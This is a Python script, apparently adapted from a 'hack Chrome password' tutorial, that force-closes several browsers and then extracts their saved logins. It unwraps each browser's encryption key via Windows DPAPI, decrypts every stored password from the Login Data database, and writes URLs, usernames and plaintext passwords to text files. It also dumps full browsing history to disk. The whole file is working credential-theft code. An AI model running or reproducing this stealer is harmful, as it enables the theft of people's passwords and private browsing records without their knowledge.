# Credits to Yicong's Tutorial (https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d) & OriginalSleeper
# --------------------------- CODE REDUCTION IS IN PROGRESS --------------------------
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

#GLOBAL CONSTANT
BROWSER_PATH_LOCAL_STATE = ""
BROWSER_PATH = ""

def get_secret_key():
    try:
        #Get secretkey
        with open( BROWSER_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as exception:
        print("%s"%str(exception))
        print("[ERROR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #AES decryption
        init_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, init_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as exception:
        print("%s"%str(exception))
        print("[ERROR] Unable to decrypt, Chrome version <80 not supported.")
        return ""
    
def get_db_connection(browser_path_login_db):
    try:
        print(browser_path_login_db)
        shutil.copy2(browser_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Browser database cannot be found")
        return None
        
def getPasswords(browser):
    global BROWSER_PATH, BROWSER_PATH_LOCAL_STATE
    try:

        # Create a file to save passwords in a .txt
        passwordsFile = open("passwords%s.txt" %(browser), "a+", encoding="utf-8")
        passwordsFile.write("------- Passwords of %s Browser --------" %(browser))

        # Get secret key
        secret_key = get_secret_key()
        # Search user profile or default folder (this is where the encrypted login password is stored)
        folders = [element for element in os.listdir(BROWSER_PATH) if re.search("^Profile*|^Default$",element)!=None]
        for folder in folders:
            # Get ciphertext from sqlite database
            browser_path_login_db = os.path.normpath(r"%s\\%s\\Login Data"%(BROWSER_PATH,folder))
            conn = get_db_connection(browser_path_login_db)
            if(secret_key and conn):
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index,login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if(url!="" and username!="" and ciphertext!=""):
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        print("Sequence: %d"%(index))
                        print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                        print("*"*50)

                        # Save into the .txt file
                        passwordsFile.write("\n URL: %s\n Username: %s\n Password: %s\n" %(url,username,decrypted_password) + "\n" + "*"*60)
                # Close database connection
                cursor.close()
                conn.close()
                #Delete temp login db
                os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] ")


def getBHistory(Bpath, browser, aPrint=False):
        # Check if browser is installed
        try:
            # Connect to the Browser History DB
            con = sqlite3.connect(Bpath + "\\Default\\History")
            success = True
        except:
            success = False
            print("[ERROR] %s Browser isn't installed on the system." %(browser))
            pass
        # Access to the browser history
        if success==True:
            cur = con.cursor()
            try:
                quer = cur.execute("SELECT title, url, visit_count, last_visit_time FROM urls")
                history = quer.fetchall()
                try:
                    os.remove("history%s.txt" %(browser))
                except:
                    pass

                # Save all browser history in a .txt file
                historyFile = open("history%s.txt" %(browser), "a+", encoding="utf-8")

                for site in history:
                    if aPrint==True:
                        print("*"*100)
                        print(str(site) + "\n")
                    historyFile.write(str(site) + "\n")
            except:
                pass

# List of all browsers ( You can add another )
Browsers = {
    "Brave": os.path.normpath(r"%s\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"%(os.environ['USERPROFILE'])),
    "Edge": os.path.normpath(r"%s\AppData\\Local\\Microsoft\\Edge\\User Data"%(os.environ['USERPROFILE'])),
    "Chrome": os.path.normpath(r"%s\AppData\\Local\\Google\\Chrome\\User Data"%(os.environ['USERPROFILE'])),
    "Firefox": os.path.normpath(r"%s\AppData\\Local\\Mozilla Foundation\\Firefox\\User Data"%(os.environ['USERPROFILE'])),
    "Opera": os.path.normpath(r"%s\AppData\\Roaming\\Opera Software\\Opera Stable"%(os.environ['USERPROFILE']))
}


if __name__ == '__main__':

    # Close browsers to avoid file opening issues
    for browser in Browsers:
        if True:
            if browser == "Opera":
                try:
                    os.system("TASKKILL /F /IM opera.exe")
                except:
                    pass
            elif browser == "Edge":
                try:
                    os.system("TASKKILL /F /IM msedge.exe")
                except:
                    pass
            elif browser == "Chrome":
                try:
                    os.system("TASKKILL /F /IM chrome.exe")
                except:
                    pass
            elif browser == "Firefox":
                try:
                    os.system("TASKKILL /F /IM firefox.exe")
                except:
                    pass
            elif browser == "Brave":
                try:
                    os.system("TASKKILL /F /IM brave.exe")
                except:
                    pass
 
    for browser in Browsers:
        if True:
            print("\n\n ------- Searching for passwords in %s browser..." %(browser))
            BROWSER_PATH = Browsers[browser]
            BROWSER_PATH_LOCAL_STATE = Browsers[browser] + "\\Local State"
            getPasswords(browser)

            print("\n\n ------- Searching for history in %s browser..." %(browser))
            print(Browsers[browser])
            getBHistory(Browsers[browser], browser, True)




